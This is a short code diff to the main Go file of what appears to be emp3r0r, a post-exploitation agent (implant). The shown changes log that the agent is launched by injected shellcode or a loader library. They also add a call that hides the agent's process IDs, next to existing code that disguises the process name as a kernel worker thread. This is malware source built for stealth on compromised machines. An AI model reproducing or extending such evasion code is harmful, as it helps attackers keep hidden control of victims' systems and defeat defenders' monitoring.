@@ -32,7 +32,6 @@ import (
 
 func main() {
 	var err error
-
 	replace := flag.Bool("replace", false, "Replace existing agent process")
 	replace_agent := *replace == true
 	version := flag.Bool("version", false, "Show version info")
@@ -43,7 +42,7 @@ func main() {
 	run_from_guardian_shellcode := util.ProcExePath(os.Getpid()) ==
 		util.ProcExePath(os.Getppid())
 	if run_from_guardian_shellcode {
-		log.Printf("emp3r0r %d is invoked by shellcode in %d",
+		log.Printf("emp3r0r %d is invoked by shellcode/loader.so in %d",
 			os.Getpid(), os.Getppid())
 	}
 
@@ -136,6 +135,12 @@ func main() {
 		agent.SetProcessName(fmt.Sprintf("[kworker/%d:%d-events]",
 			util.RandInt(1, 20),
 			util.RandInt(0, 6)))
+	}
+
+	// hide agent process
+	err = agent.HidePIDs()
+	if err != nil {
+		log.Printf("Hiding PIDs: %v", err)
 	}
 
 	// run as elvish shell
